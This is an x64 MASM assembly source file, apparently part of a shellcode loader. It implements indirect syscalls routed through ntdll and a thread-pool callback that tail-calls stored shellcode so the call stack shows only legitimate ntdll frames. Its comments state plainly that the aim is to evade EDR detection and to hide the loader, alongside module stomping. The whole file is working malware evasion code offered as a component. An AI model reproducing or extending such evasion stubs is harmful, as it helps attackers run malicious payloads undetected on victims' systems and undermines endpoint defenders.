;; AsmStub.asm - Indirect Syscall Stub + Call Stack Spoofing (x64 MASM)
;;
;; SetSSn / RunSyscall   — indirect syscall engine
;; SetSpoofTarget        — store shellcode address for callback
;; SpoofCallback         — thread pool callback with stack frame spoofing

.data
    wSSn            DWORD   000h        ; Current SSN
    qSyscallAddr    QWORD   000h        ; Address of syscall;ret in ntdll
    qTargetFunc     QWORD   000h        ; Shellcode address for spoofed callback

.code

; -----------------------------------------------
; SetSSn(DWORD wSystemCall, PVOID pSyscallAddress)
;   ecx = SSN
;   rdx = syscall;ret address in ntdll
; -----------------------------------------------
SetSSn PROC
    mov wSSn, ecx
    mov qSyscallAddr, rdx
    ret
SetSSn ENDP

; -----------------------------------------------
; RunSyscall(...)
;   Executes indirect syscall by jumping to ntdll
;   syscall instruction, avoiding syscall from
;   our own .text section (EDR detection)
; -----------------------------------------------
RunSyscall PROC
    mov r10, rcx                    ; Standard syscall ABI: r10 = first arg
    mov eax, wSSn                   ; EAX = SSN
    jmp QWORD PTR [qSyscallAddr]   ; Jump to ntdll's syscall;ret
    ret                             ; Never reached (ret in ntdll)
RunSyscall ENDP

; -----------------------------------------------
; SetSpoofTarget(PVOID pTarget)
;   RCX = shellcode / stomped address
;   Stores target for SpoofCallback to jump to
; -----------------------------------------------
SetSpoofTarget PROC
    mov qTargetFunc, rcx
    ret
SetSpoofTarget ENDP

; -----------------------------------------------
; SpoofCallback - Thread pool work callback with
;   call stack spoofing via tail-call
;
; Called by ntdll thread pool as:
;   SpoofCallback(Instance, Context, Work)
;   RCX = PTP_CALLBACK_INSTANCE
;   RDX = PVOID Context (unused)
;   R8  = PTP_WORK
;
; Stack on entry (placed by thread pool CALL):
;   [RSP] = return to TppWorkpExecute (ntdll)
;
; Tail-call (JMP, not CALL) to shellcode means:
;   - No new stack frame is created
;   - Shellcode inherits the clean thread pool
;     call stack:
;       shellcode RIP
;       -> TppWorkpExecute   (ntdll)
;       -> TppWorkerThread   (ntdll)
;       -> RtlUserThreadStart (ntdll)
;   - No trace of the loader in the stack
;   - Combined with module stomping, RIP itself
;     is inside a legitimate signed DLL
; -----------------------------------------------
SpoofCallback PROC
    mov rax, QWORD PTR [qTargetFunc]
    jmp rax                         ; tail-call: preserves thread pool frames
SpoofCallback ENDP

end
